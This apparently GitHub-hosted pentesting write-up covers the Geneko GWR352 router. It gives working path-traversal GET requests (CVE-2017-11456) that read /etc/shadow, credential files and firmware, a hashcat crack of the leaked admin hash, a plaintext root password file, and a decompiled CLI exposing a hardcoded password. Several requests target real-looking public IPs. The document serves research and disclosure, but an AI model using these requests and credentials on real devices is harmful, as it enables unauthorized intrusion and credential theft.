# Geneko GWR352 Pentesting

![image](https://user-images.githubusercontent.com/72421091/133135861-58123964-f897-4f29-9b14-6de6bcacb6f4.png)


## Disclaimer 

All information and software available on this page are for educational purposes only.

## To do

- privsec to root
- root hash decrypt
- firmware files
- filesystem tree
- exploit to use path travseral to view files and directories ( ls and cat using get requests)


## User manual  

[User manual](User%20manual)

## Web page

Login page port 80

![image](https://user-images.githubusercontent.com/72421091/133136116-241dd48a-8930-488f-aaeb-c984e57ebb35.png)

```html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">

<html>
	<head>
		<meta name="generator" content="HTML Tidy, see www.w3.org">
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
		<!-- GKO: Alternate CSS links -->
		<link href="files/ruter.css" title="non-ie" type="text/css" rel="stylesheet">
		<link href="files/ruter-ie.css" title="ie" type="text/css" rel="alternate stylesheet">
		<script type="text/javascript">ignoreAjaxAlert = 0; interval_pionter = 0; first_start = true;</script>
		<script type="text/javascript" src="lib/customization.js"></script>
		<script type="text/javascript" src="lib/framework.js"></script>
		<script type="text/javascript" src="lib/commons.js"></script>
		<script type="text/javascript" src="lib/index.js"></script>
		<script type="text/javascript" src="lib/jsong.js"></script>
		<script type="text/javascript" src="lib/admin.js"></script>
		<script type="text/javascript" src="lib/adsl.js"></script>
		<script type="text/javascript" src="lib/cli.js"></script>
		<script type="text/javascript" src="lib/dhcpser.js"></script>
		<script type="text/javascript" src="lib/dmz.js"></script>
		<script type="text/javascript" src="lib/dynDNS.js"></script>
		<script type="text/javascript" src="lib/encoder.js"></script>
		<script type="text/javascript" src="lib/firewall.js"></script>
		<script type="text/javascript" src="lib/gpio.js"></script>
		<script type="text/javascript" src="lib/management.js"></script>
		<script type="text/javascript" src="lib/network.js"></script>
		<script type="text/javascript" src="lib/openVPN.js"></script>
		<script type="text/javascript" src="lib/secur.js"></script>
		<script type="text/javascript" src="lib/smsControl.js"></script>
		<script type="text/javascript" src="lib/status.js"></script>
		<script type="text/javascript" src="lib/upsSettings.js"></script>
		<script type="text/javascript" src="lib/vpn.js"></script>
		<script type="text/javascript" src="lib/wanSettings.js"></script>
		<script type="text/javascript">document.write(html_title);</script>
	</head>

	<body onload="init();">
		<iframe src="" id="loading" style="display:none;border:none"></iframe>
		<img id="loading_img" src="files/loader.gif"/>
		<img id="loading_img2" style="display:none;z-index:111000;position:absolute;width:31px;height:31px;border:none;" src="files/loader.gif"/>

		<div id="loadingOverThePanes" style="background-color:white;filter:alpha(opacity=70);-moz-opacity:.70;opacity:.70;
			margin:0px;padding:0px;display:none;position:absolute;z-index:110000;">
		</div>

		<div id="zaglavlje">
			<table cellspacing="0px" cellpadding="0px" width="100%">
				<tr>
					<td style="background-image:url('files/piks1.jpg');background-repeat: repeat-x">
						<img alt="logo" src="files/zaglnovo.jpg" usemap="#zaglmap"/>
					</td>
					<td style="font-size:40px;font-style:bold;"></td>
				</tr>
			</table>
		</div>
		<div id="logout">
			<!--a href="javascript: logout();"><span id="logoutA">Logout </span> </a> &nbsp;  -->
		</div>

		<map id ="zaglmap" name="zaglmap">
			<area shape="rect" coords="0,0,200,70" href="javascript:open_url();"/>
		</map>
		<table id="tabPocetna">
			<tr>
				<td id="tdLevimeni" rowspan="2">
					<div id="meni"></div>
				</td>
				<td id="tdGlavni">
					<div id="divOkvir"></div>
				</td>
			</tr>
		</table>
		<div id="futer">
			<span>
				Copyright &copy; <script>document.write(copyright_year + ' '); document.write(copyright_company);</script>. All rights reserved.<br>
				<script>document.write(company_link);</script>
			</span>
		</div>

		<div id="dAlert" class="aler"></div>
		<div id="dOkCancel" class="aler"></div>
		<iframe src="" id="box" style="border:none;display:none;"></iframe>
	</body>
</html>
```

Default administration credentials are admin/admin (User Manual). It didin't work in my case.  

## Vulnerabilities

Using routersploit and searching, i found that the router vulnerable to a Unauthenticated Path Traversal vulnerability CVE-2017-11456

### CVE-2017-11456 Unauthenticated Path Traversal vulnerability

Geneko GWR routers allow directory traversal sequences starting with a /../ substring, as demonstrated by unauthenticated read access to the configuration file.

https://www.cvedetails.com/cve/CVE-2017-11456/

https://www.exploit-db.com/exploits/44072

### Information Disclosure

If the administrator has previously backed up the configuration file, then the attacker can access

https://IP/configuration/confFile.bkg

Web access in config file 

```
===>admin_admin

#==> Allowed value: [true|false]
admin_admin.enable=true

#==> Allowed value: string
admin_admin.username="admin"

#==> Allowed value: string
admin_admin.password="XXXXXXX"

#==> Allowed value: string from set ["http","https","both"]
admin_admin.web_access="http"

#==> Allowed value: numeric in range [1-65535]
admin_admin.http_port=80

#==> Allowed value: numeric in range [1-65535]
admin_admin.https_port=443

#==> Allowed value: numeric in range [1-60]
admin_admin.gui_timeout=15
```
https://ssd-disclosure.com/ssd-advisory-geneko-routers-information-disclosure/

### Slow HTTP Denial of Service Attack

Your web server is vulnerable to Slow HTTP DoS (Denial of Service) attacks.

Slowloris and Slow HTTP POST DoS attacks rely on the fact that the HTTP protocol, by design, requires requests to be completely received by the server before they are processed. If an HTTP request is not complete, or if the transfer rate is very low, the server keeps its resources busy waiting for the rest of the data. If the server keeps too many resources busy, this creates a denial of service.

#### Impact

A single machine can take down another machine's web server with minimal bandwidth and side effects on unrelated services and ports.

https://www.funtoo.org/Slowloris_DOS_Mitigation_Guide
https://web.archive.org/web/20180329210925/http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/

### CVE-2008-7220 : Vulnerable JavaScript library prototypejs

prototypejs 1.5.1
URL: http://10.10.10.10/lib/framework.js

Detection method: The library's name and version were determined based on the file's contents.

Unspecified vulnerability in Prototype JavaScript framework (prototypejs) before 1.6.0.2 allows attackers to make "cross-site ajax requests" via unknown vectors.

https://www.cvedetails.com/cve/CVE-2008-7220/

POC : https://github.com/followboy1999/CVE-2008-7220

### CVE-2013-1813

Used version : busybox http 1.19.4

util-linux/mdev.c in BusyBox before 1.21.0 uses 0777 permissions for parent directories when creating nested directories under /dev/, which allows local users to have unknown impact and attack vectors.

https://vuldb.com/?id.65544

### CVE-2017-16544

In the add_match function in libbb/lineedit.c in BusyBox through 1.27.2, the tab autocomplete feature of the shell, used to get a list of filenames in a directory, does not sanitize filenames and results in executing any escape sequence in the terminal. This could potentially result in code execution, arbitrary file writes, or other attacks.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-16544
https://web.archive.org/web/20171121002345/https://www.twistlock.com/2017/11/20/cve-2017-16544-busybox-autocompletion-vulnerability/

POC
```
The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------
```
## Exploit Unauthenticated Path Traversal vulnerability 

https://www.exploit-db.com/exploits/44072

sending the following GET request to read **/etc/shadow** file :

```
GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "38-183-384313b8"
Last-Modified: Tue, 30 Nov 1999 00:00:56 GMT
Date: Mon, 06 Dec 1999 03:41:08 GMT
Content-Type: application/octet-stream
Content-Length: 387

root:$1$ryjw5yTs$xoQlzavABZ5c7gQuD7jKO0:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
admin:$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:10933:0:99999:7:::
```

Using hashcat to crack the hash password
```
hashcat -m 500 /root/.hashcat/hash3.txt /root/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
```
```
$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:admin
```

You can use https://www.onlinehashcrack.com/ 

![image](https://user-images.githubusercontent.com/72421091/133137696-11d7d281-e1d2-47a8-91bd-c5dedefd0477.png)

For the web login we can find the password using the exploit to read config files

```
GET /../../../../../../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "626e-7a-38431681"
Last-Modified: Tue, 30 Nov 1999 00:12:49 GMT
Date: Mon, 06 Dec 1999 04:17:40 GMT
Content-Type: application/octet-stream
Content-Length: 122


{"enable":true,"username":"admin","password":"XXXX","web_access":0,"http_port":80,"https_port":443,"gui_timeout":15}

```
We found the password for the web interface 

![image](https://user-images.githubusercontent.com/72421091/133138429-9fd5ee8a-4b35-422a-9e74-8dc409ddf913.png)

## SSH

CLI can be acces via SSH

![image](https://user-images.githubusercontent.com/72421091/133138635-49fc9307-8a80-4d40-8411-ccb6b107fcf2.png)

SSH to router 

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.10

admin@105.73.195.49's password: (password form the CLI interface settings for SSH)
```

```
 ----------------------------------------
  GWR Router Command Line Interface v0.8
 ----------------------------------------
  MAIN MODE
 -----------

 v - VIEW mode
 e - EDIT mode
 h - HELP
 x - quit

choose mode>
```

We can found all the available commands here [GWR-CLI-Documentation.pdf](User%20manual/GWR-CLI-Documentation.pdf)

## Filesystem

We can use the path travaersal exploit to search for files

The cli binary file can be found at /root/cli (leaked form the /etc/passwd)

```

GET /../../../../../../../../../../../../root/cli HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

```
We can se save the file or check form the request output

```
┌──(kali㉿kali)-[~]
└─$ file cli
cli: ELF 32-bit LSB executable, ARM, version 1 (ARM), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

```
┌──(kali㉿kali)-[~]
└─$ strings cli
/lib/ld-uClibc.so.0
libgcc_s.so.1
__deregister_frame_info
strlen
_Jv_RegisterClasses
__register_frame_info
libc.so.0
strcpy
popen
stdout
sigemptyset
pclose
_DYNAMIC
fgets
perror
tcflush
system
remove
sleep
__fgetc_unlocked
alarm
fprintf
__stdin
read
strncmp
sigaction
__uClibc_main
fopen
fclose
tcgetattr
fgetc
sprintf
fputc
__data_start
tcsetattr
__fputc_unlocked
_edata
__bss_start
__bss_start__
_end
__bss_end__
__end__
_init
_fini
GCC_3.0
v0.9
v0.1
evhgx
/home/www/lib/customization.js
geneko_pass.txt
/mnt/flash/etc/edit_pass.txt
./edit.sh
./view.sh
./geneko.sh
/var/run/cli_editmode.lock
./editmode_test_crashed.sh
/bin/cat %s | /bin/grep router_model | /usr/bin/cut -d "'" -f 2 | /usr/bin/tr -d                                                                     '
  %s Command Line Interface %s
clear
  MAIN MODE
 -----------
 v - VIEW mode
 e - EDIT mode
 h - HELP
 x - quit
choose mode>
  HELP MODE
 -----------
 x - leave current mode
 -------------
choose option>
press any key to return...
login timeout!!!
/usr/bin/test-web-login.sh
Another session in WEB mode is already running!!!
EDIT mode is not available.
press any key to continue...
Another CLI in EDIT mode is already running!!!
Password:
  EDIT MODE
 twice tab - list of commands
 x - leave current mode
 -------------------------------------
PANIC:You need to reboot the %s in order to save the consistency of router setti                                                                    ngs!!!
Invalid password for EDIT mode!!!
fndilo\giafd
  VIEW MODE
 ------------------------------------
Thank you for using %s Command Line Interface!
Warning: EDIT mode is not possible!!!
Please choose a valid option or check CapsLock key!
help_menu.txt
help_view.txt
help_edit.txt
GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
GCC: (GNU) 3.4.3
GCC: (GNU) 3.4.3
GCC: (GNU) 3.4.3
GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
.shstrtab
.interp
.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.data
.bss
.comment

```

We can decompile the elf binary using Ghidra

![image](https://user-images.githubusercontent.com/72421091/133150193-6f9846e3-d25a-45da-92d2-a39a93a00837.png)

All decompiled functions [Decompiled CLI](Decompiled%20CLI)

Some functions exemples :
- Main
```c

undefined4 main(void)

{
  int iVar1;
  FILE *__stream;
  int local_14;
  
  FUN_00008c28();
  FUN_00008bd8();
  while( true ) {
    while( true ) {
      FUN_00008ae0();
      FUN_00008dd4();
      read(0,&DAT_00012328,1);
      DAT_000122c0 = '\0';
      for (local_14 = 0; local_14 < 5; local_14 = local_14 + 1) {
        iVar1 = strncmp(&DAT_00012328,&DAT_00009bf5 + local_14,1);
        if (iVar1 == 0) {
          DAT_000122c0 = '\x01';
          local_14 = 5;
        }
      }
      if (DAT_000122c0 != '\0') break;
      fprintf(stdout,"\nPlease choose a valid option or check CapsLock key!\n");
      sleep(1);
    }
    iVar1 = strncmp(&DAT_00012328,"evhgx",1);
    if (iVar1 == 0) {
      __stream = fopen("/mnt/flash/etc/edit_pass.txt","r");
      if (__stream == (FILE *)0x0) {
        DAT_000122b8 = 0;
        perror("/mnt/flash/etc/edit_pass.txt");
        fprintf(stdout,"\nWarning: EDIT mode is not possible!!!\n");
        sleep(2);
      }
      else {
        DAT_000122b8 = 1;
        fgets(&DAT_000123e8,0x14,__stream);
        fclose(__stream);
      }
      FUN_00009258();
    }
    iVar1 = strncmp(&DAT_00012328,"vhgx",1);
    if (iVar1 == 0) {
      FUN_00009874();
    }
    iVar1 = strncmp(&DAT_00012328,"hgx",1);
    if (iVar1 == 0) {
      FUN_000090d8();
    }
    iVar1 = strncmp(&DAT_00012328,"gx",1);
    if (iVar1 == 0) {
      FUN_000096dc();
    }
    iVar1 = strncmp(&DAT_00012328,"x",1);
    if (iVar1 == 0) break;
    FUN_00008ae0();
  }
  FUN_0000990c();
  return 0;
}
```
- FUN_000096dc
```c

void FUN_000096dc(void)

{
  FILE *__stream;
  size_t __n;
  int iVar1;
  int local_18;
  
  __stream = fopen("geneko_pass.txt","r");
  if (__stream == (FILE *)0x0) {
    DAT_000122b9 = '\0';
    perror("geneko_pass.txt");
    sleep(2);
  }
  else {
    DAT_000122b9 = '\x01';
    fgets(&DAT_00012300,0x14,__stream);
    fclose(__stream);
  }
  FUN_00008b6c();
  read(0,&DAT_00012314,0x14);
  strcpy(&DAT_00012300,"fndilo\\giafd");
  for (local_18 = 0; (local_18 < 0x14 && ((&DAT_00012300)[local_18] != '\0'));
      local_18 = local_18 + 1) {
    (&DAT_00012300)[local_18] = (&DAT_00012300)[local_18] + (char)local_18 + -1;
  }
  __n = strlen(&DAT_00012300);
  iVar1 = strncmp(&DAT_00012314,&DAT_00012300,__n);
  if ((iVar1 == 0) && (DAT_000122b9 == '\x01')) {
    FUN_00008b30();
    system("clear");
    system("./geneko.sh");
  }
  return;
}


```
You can find all the decompiled functions here [Decompiled CLI](Decompiled%20CLI)

### Files

- mnt/flash/etc/edit_pass.txt : has the web interface password
- /home/www/lib/customization.js
```js
// Kastomizacioni fajl za Geneko //
var html_title = '<title>Geneko GWR Router</title>';
var router_model = 'GWR Router';
var copyright_year = '2008 - 2014';
var copyright_company = 'Geneko';
var company_url = 'http://www.geneko.rs';
var company_link = '<a href="' + company_url + '" target="_blank">' + company_url + '</a>';
var remote_management_protocol = 'Geneko';
var router_os = 'geneko';

function open_url(){
	window.open(company_url);
}
```
- root/geneko_pass.txt : root password ?
```
overload
```
- /root/help_menu.txt
```
General help tips:

- Press TAB button twice to display all available commands in current mode
- Press ctrl+d or type "exit" command to quit from current mode
- Use TAB button to complete commands
- Use Up/Down buttons to cycle through typing history
- Press ctrl+u to kill typed line
- Use ctrl+c to quit from programs
- Most commands have "--help"/"-h" switch for displaying short help


For short description about specific mode commands choose:

1 - VIEW mode commands
2 - EDIT mode commands
```
- /root/help_view.txt
```
Short help about VIEW mode commands:

arping                 - Ping hosts by ARP requests/replies
cal                    - Displays a calendar
clear                  - Clear screen
configuration_show     - Displays a calendar router's configuration
cpu                    - Provides an view of processor activity in real time
date                   - Displays the current time
df                     - Displays the filesystem space used and space available
dmesg                  - Displays or controls the kernel ring buffer
free                   - Displays the amount of free and used system memory
help                   - Go to HELP mode
interfaces-all         - Displays all interfaces
interfaces-up          - Displays up interfaces
ipcalc                 - Calculate IP network settings from a IP address
ipsec-routes           - Displays IPSec routes
ipsec-sa-status        - Displays IPSec SA status
ipsec-sa-status-detail - Displays more detailed IPSec SA status
ipsec-status           - Displays IPSec process status
iptables-view          - Displays configuration of IPv4 packet filtering and NAT
local_dns              - Show local DNS setting
modem_state            - Displays mobile module current connection state
modem_info             - Displays mobile module info
network_operators      - Displays list of available operators
netstat                - Displays Linux networking information
nslookup               - Queries the nameserver for the IP address of the given HOST, optionally using a specified DNS server
ping                   - Send ICMP ECHO_REQUEST packets to network hosts
ping_extended          - Send ICMP ECHO_REQUEST packets to network hosts. Extended options
pppstats               - Displays PPP statistics
ps                     - Report process status
route                  - Displays a calendar the kernel's routing tables
router_monitoring      - Displays a router's base information, LAN information/statistics, WAN information/statistics/connection
show                   - Displays a calendar firmware version, hardware version, signal strength and home network information
snmp-view              - View SNMP protocol configuration
ssh                    - OpenSSH SSH client(remote login)
syslog_export          - Export router's syslog
syslog_start           - Starts syslog
syslog_start+tail      - Starts syslog and displays growing log contents in realtime
syslog_start+view      - Starts syslog and displays current log contents
syslog_stop            - Stops syslog
syslog_tail            - Displays last N syslog lines
telnet                 - User interface to the TELNET protocol
traceroute             - Displays the route packets trace to network host
uptime                 - Displays route uptime
```

- /root/help_edit.txt
```
Short help about EDIT mode commands:

arping                 - Ping hosts by ARP requests/replies
cal                    - Displays a calendar
clear                  - Clear screen
configuration_export   - Export router's configuration
configuration_import   - Import router's configuration
configuration_show     - Displays router's configuration
cpu                    - Provides an view of processor activity in real time
date                   - Displays the current time in the given FORMAT, or sets the system date
df                     - Displays the filesystem space used and space available
dmesg                  - Displays or controls the kernel ring buffer
erase-firmware-memory  - Erase the firmware
factory_default        - Restore router settings to factory default
free                   - Displays the amount of free and used system memory
help                   - Go to HELP mode
hwclock                - Query and set the hardware clock (RTC)
ifconfig               - Configure a network interface
interfaces-all         - Displays all interfaces
interfaces-up          - Displays up interfaces
ip                     - Displays / manipulate routing, devices, policy routing and tunnels
ipcalc                 - Calculate IP network settings from a IP address
ipsec-mode             - Choose IPSec tunnel mode
ipsec-restart          - Restart IPSec process
ipsec-routes           - Displays IPSec routes
ipsec-sa-status        - Displays IPSec SA status
ipsec-sa-status-detail - Displays more detailed IPSec SA status
ipsec-settings         - Configure IPSec parameters
ipsec-start            - Start IPSec process
ipsec-status           - Displays IPSec process status
ipsec-stop             - Stop IPSec process
iptables               - Administration tool for IPv4 packet filtering and NAT
iptables-view          - Displays configuration of IPv4 packet filtering and NAT
killall                - Send a signal (default is SIGTERM) to the specified process(es)
local_dns              - Displays / manipulate local DNS setting
mac_address            - Change ethernet port mac address
modem_state            - Displays mobile module current connection state
modem_info             - Displays mobile module info
netstat                - Displays Linux networking information
network_operators      - Displays list of available operators
nslookup               - Queries the nameserver for the IP address of the given HOST, optionally using a specified DNS server
ntpdate                - Set the date and time via NTP
passwd-edit-mode       - Set password for EDIT mode
pidof                  - Lists the PIDs of all processes with names that match the names on the command line
ping                   - Send ICMP ECHO_REQUEST packets to network hosts
ping_extended          - Send ICMP ECHO_REQUEST packets to network hosts. Extended options
ppp-activity           - Activate / deactivate the currently PPP connection, switchover SIM cards
pppstats               - Displays PPP statistics
ps                     - Report process status
reboot                 - Perform router reboot
rip-quagga-conf        - Configure RIP protocol
rip-ripd-conf          - Configure RIP protocol
route                  - Edit the kernel's routing tables
router_monitoring      - Displays a router's base information, LAN information/statistics, WAN information/statistics/connection
send_at_command        - Send AT commands to mobile module
services               - Facility for service menagement
show                   - Displays firmware version, hardware version, signal strength and home network information
snmp-conf              - Configure SNMP protocol
snmp-view              - View SNMP protocol configuration
sms_send               - Send SMS message
ssh                    - OpenSSH SSH client(remote login)
syslog_export          - Export router's syslog
syslog_start           - Starts syslog
syslog_start+tail      - Starts syslog and displays growing log contents in realtime
syslog_start+view      - Starts syslog and displays current log contents
syslog_stop            - Stops syslog
syslog_tail            - Displays last N syslog lines
telnet                 - User interface to the TELNET protocol
traceroute             - Displays the route packets trace to network host
upfirmware             - Upgrade router firmware via ftp
uptime                 - Displays route uptime
wan-settings           - Displays or configure ppp WAN settings
write                  - Write current router configuration to flash memory
```

- /usr/bin/test-web-login.sh
```
#!/home/app/dash
/bin/cat /home/tmp/j_auth.tmp | /bin/grep "blocked=false" > /dev/null
```
- /root/editmode_test_crashed.sh
```
#!/home/app/dash

/bin/touch /var/run/cli_editmode.pid > /dev/null 2>&1
PID=$(/bin/cat /var/run/cli_editmode.pid)
/bin/ps w|/usr/bin/awk -F" " '{print $1}'|grep $PID > /dev/null 2>&1
TEMP=$(echo $?)

if [ $TEMP -ne 0 ]; then
	/bin/rm -f /var/run/cli_editmode.lock
fi
```
- /root/geneko.sh 
```
#!/bin/sh

PS1='[\u@\h \W]\$ '
export PS1

/root/bash
```

- /root/view.sh
```
#!/bin/sh

PS1='view-mode>'
PATH=/usr/local/bin/view
export PS1

/root/bash --restricted --rcfile /root/view.rc
```
- /root/edit.sh
```
#!/home/app/dash

PS1='edit-mode>'
PATH=/usr/local/bin/edit:/usr/local/bin/view
export PS1
echo $$ > /var/run/cli_editmode.pid
/root/bash --restricted --rcfile /root/edit.rc
```

- /root/view.rc 
```
enable -n alias
enable -n times
enable -n .
enable -n :
enable -n [
enable -n bind
enable -n break
enable -n builtin
#enable -n caller
enable -n cd
enable -n command
enable -n compgen
enable -n complete
enable -n continue
enable -n declare
#enable -n dirs
enable -n echo
enable -n eval
enable -n exec
enable -n export
enable -n false
enable -n fc
enable -n getopts
enable -n hash
enable -n history
enable -n kill
enable -n let
enable -n local
enable -n logout
#enable -n popd
enable -n printf
#enable -n pushd
enable -n pwd
enable -n read
enable -n readonly
enable -n return
enable -n set
enable -n shift
enable -n shopt
enable -n source
enable -n test
enable -n trap
enable -n true
enable -n type
enable -n typeset
enable -n ulimit
enable -n umask
enable -n unalias
enable -n unset
enable -n wait
enable -n enable
/bin/echo $$ > /root/view_bash.pid

TMOUT=120
```
- /usr/local/bin/edit/ : 

![image](https://user-images.githubusercontent.com/72421091/133154833-da38a736-3afd-456a-bb85-d00d420747da.png)

- /usr/local/bin/view/
- ![image](https://user-images.githubusercontent.com/72421091/133155072-311a8447-e61d-4e6f-94b9-8e84a352f6da.png)


- some binaries : 
   - /bin/cat /bin/grep /usr/bin/cut /usr/bin/tr /bin/rm /usr/bin/awk /bin/touch /bin/echo 
   - /root/bash  /home/app/dash  

## Firmware reverse (To do)

Html page used for update home/www/adminUpdate.html http://10.10.10.10/adminUpdate.html

Firmware : https://easy-router.de/wp-content/uploads/2018/03/firmware_3.0.19_352.cr 

SSH CLI EDIT Commands 
- upfirmware : Upgrade router firmware via ftp

firmware.bin
```
GET /../../../../../../../../../../../../mnt/flash/firmware.bin HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
i was able to extract the firmware.bin bzip2 -> tar -> files

binwalk / 7z e
binwalk -Me better choice

Reverse CLI -> done
Firmwalker output important files
Firmware files list
try simulation ?

## Path traversal show also dir / at the end 
full filesystem leak

GET /../../../../../../../../../../../../ HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

## Privesc

CLI via SSH admin/admin / all commands runed via cli has the root priv /root/.bash_history
available binaries in view and edit mode : https://gtfobins.github.io/
/usr/local/bin/edit/ --> need edit password /mnt/flash/etc/edit_pass.txt  
/usr/local/bin/view/  

## Services

### SSH
```
22/tcp open  ssh     Dropbear sshd 2014.63 (protocol 2.0)
| vulscan: VulDB - https://vuldb.com:
| [123110] Dropbear up to 2018.76 svr-auth.c recv_msg_userauth_request User information disclosure
| [101509] Dropbear up to 2017.74 TCP Listener memory corruption
| [97511] Dropbear SSH up to 2016 dbclient privilege escalation
| [97510] Dropbear SSH up to 2016 dropbearconvert privilege escalation
| [97509] Dropbear SSH up to 2016 privilege escalation
| [81407] Dropbear SSH up to 2016.71 Shell Command Restriction privilege escalation
| [9860] Simon Tatham PuTTY up to 2010-06-01 SSH Handshake Message Length sshrsa.c/sshdss.c getstring Numeric Error
| [170398] Dropbear up to 2020.78 Filename scp.c unknown vulnerability
| 
| MITRE CVE - https://cve.mitre.org:
| [CVE-2012-0920] Use-after-free vulnerability in Dropbear SSH Server 0.52 through 2012.54, when command restriction and public key authentication are enabled, allows remote authenticated users to execute arbitrary code and bypass command restrictions via multiple crafted command requests, related to "channels concurrency."
| [CVE-2009-3340] Unspecified vulnerability in FreeSSHD 1.2.4 allows remote attackers to cause a denial of service via unknown vectors, as demonstrated by a certain module in VulnDisco Pack Professional 8.11.  NOTE: as of 20090917, this disclosure has no actionable information. However, because the VulnDisco Pack author is a reliable researcher, the issue is being assigned a CVE identifier for tracking purposes.
| [CVE-2008-3234] sshd in OpenSSH 4 on Debian GNU/Linux, and the 20070303 OpenSSH snapshot, allows remote authenticated users to obtain access to arbitrary SELinux roles by appending a :/ (colon slash) sequence, followed by the role name, to the username.
| [CVE-2006-5794] Unspecified vulnerability in the sshd Privilege Separation Monitor in OpenSSH before 4.5 causes weaker verification that authentication has been successful, which might allow attackers to bypass authentication. NOTE: as of 20061108, it is believed that this issue is only exploitable by leveraging vulnerabilities in the unprivileged process, which are not known to exist.
| [CVE-2006-1283] opiepasswd in One-Time Passwords in Everything (OPIE) in FreeBSD 4.10-RELEASE-p22 through 6.1-STABLE before 20060322 uses the getlogin function to determine the invoking user account, which might allow local users to configure OPIE access to the root account and possibly gain root privileges if a root shell is permitted by the configuration of the wheel group or sshd.
| [CVE-2002-0460] Bitvise WinSSHD before 2002-03-16 allows remote attackers to cause a denial of service (resource exhaustion) via a large number of incomplete connections that are not properly terminated, which are not properly freed by SSHd.
| 
| SecurityFocus - https://www.securityfocus.com/bid/:
| [92974] Dropbear SSH CVE-2016-7406 Format String Vulnerability
| [92973] Dropbear SSH CVE-2016-7409 Information Disclosure Vulnerability
| [92972] Dropbear CVE-2016-7407 Local Code Execution Vulnerability
| [92970] Dropbear SSH CVE-2016-7408 Remote Code Execution Vulnerability
| [84322] Dropbear SSH CVE-2016-3116 Security Bypass Vulnerability
| [79327] Freesshd CVE-2009-3340 Denial-Of-Service Vulnerability
| [72821] Dropbear SSH Multiple Local Security Bypass Vulnerabilities
| [65562] LXC 'sshd' Template Remote Privilege Escalation Vulnerability
| [63605] OpenSSH 'sshd' Process Remote Memory Corruption Vulnerability
| [62993] Dropbear SSH 'svr-auth.c' User Enumeration Weakness
| [62958] Dropbear SSH 'buf_decompress()' Function Denial of Service Vulnerability
| [62110] MikroTik RouterOS 'sshd' Component Multiple Heap Memory Corruption Vulnerabilities
| [61644] PuTTY Private Key 'putty/sshdss.c' Multiple Information Disclosure Vulnerabilities
| [56785] freeSSHd Authentication Mechanism Authentication Bypass Vulnerability
| [52159] Dropbear SSH Server Use After Free Remote Code Execution Vulnerability
| [38887] freeSSHd SSH2 Connection Data Remote Buffer Overflow Vulnerability
| [38487] ProSSHD 'scp_get()' Buffer Overflow Vulnerability
| [37116] Sun Solaris 'sshd(1M)' Timeout Mechanism Remote Denial Of Service Vulnerability
| [36235] freeSSHd Pre Authentication Error Remote Denial of Service Vulnerability
| [32972] freeSSHd SFTP Commands Multiple Remote Buffer Overflow Vulnerabilities
| [31872] freeSSHd SFTP 'rename' Remote Buffer Overflow Vulnerability
| [29453] freeSSHd SFTP 'opendir' Buffer Overflow Vulnerability
| [27845] freeSSHd 'SSH2_MSG_NEWKEYS' Packet Remote Denial of Service Vulnerability
| [22761] Dropbear Hostkey Mismatch Warning Weakness
| [17024] Dropbear Remote Denial Of Service Vulnerability
| [15923] Dropbear SSH Server Remote Buffer Overflow Vulnerability
| [10803] Dropbear SSH Server Digital Signature Standard Unspecified Authentication Vulnerability
| [8439] Dropbear SSH Server Username Format String Vulnerability
| [4803] OpenBSD sshd BSD Authentication Implementation Error Vulnerability
| [4300] BitVise WinSSHD Numerous Connections DoS Vulnerability
| [3494] SSHD CPU utilization bug
| [797] Sshd RSAREF Buffer Overflow Vulnerability
| 
| IBM X-Force - https://exchange.xforce.ibmcloud.com:
| [86268] PuTTY putty/sshdss.c information disclosure
| [80476] FreeSSHd security bypass
| [73444] Dropbear SSH Server code execution
| [71964] FreeSSHd packet denial of service
| [61486] Novell Netware SSHD.NLM and SFTP-SVR.NLM buffer overflow
| [56626] ProSSHD scp_get() buffer overflow
| [54401] Sun Solaris sshd(1M) denial of service
| [53611] FreeSSHd string denial of service
| [52434] freeSSHd open buffer overflow
| [46046] freeSSHd rename and realpath parameters buffer overflow
| [44279] OpenSSH sshd weak security
| [44037] OpenSSH sshd SELinux role unauthorized access
| [42764] freeSSHd SFTP buffer overflow
| [41438] OpenSSH sshd session hijacking
| [40612] FreeSSHd SSH server denial of service
| [39354] FortressSSH sshd.exe denial of service
| [37199] DenyHosts sshd log files denial of service
| [32762] Dropbear SSH client hostkey mismatch weak security
| [25075] Dropbear SSH Server connection denial of service
| [23672] Dropbear SSH Server svr-chansession.c buffer overflow
| [20930] OpenSSH sshd.c LoginGraceTime denial of service
| [16810] Dropbear DSS verification code execution
| [12927] Dropbear login using format specifier causes format string
